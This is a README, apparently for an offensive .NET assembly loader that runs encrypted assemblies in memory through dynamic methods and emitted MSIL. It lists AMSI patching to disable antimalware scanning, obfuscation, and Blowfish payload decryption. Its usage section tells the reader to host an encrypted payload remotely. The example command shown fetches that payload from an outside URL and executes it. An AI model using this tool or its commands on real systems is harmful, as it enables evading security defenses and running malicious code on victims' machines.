
the technique has been shared by @bohops, which perform DotNET assembly loading using dynamic methods and Emitted MSIL Instructions. 

### What i have done ? 

* implement ECB blow fish stream decryption for Assembly payload.
* adding obfuscation methods 
* support AMSI patching

### How to use

- compile the project into x64 release 
- upload your assembly payload wanna load into http://blowfish.online-domain-tools.com/ for encryption or you can use any alternative but i like this site as it allows to 
host remote files. 
- execute the tool ( DotNET_Assemblyloader.exe "[remote encrypted payload]" "password" "assembly arguments" )
```
e.g 

C:\tmp\DotNET_Assemblyloader.exe "http://blowfish.online-domain-tools.com/?taskId=49397133&cacheIdentifier=2023-02-04__03-48-10__330597&do=downloadAsBinary" 123456 -group=system
 
```
![image](https://user-images.githubusercontent.com/10256911/216748095-57a297b7-4053-4f28-87ee-39e55e73d9d6.png)



 
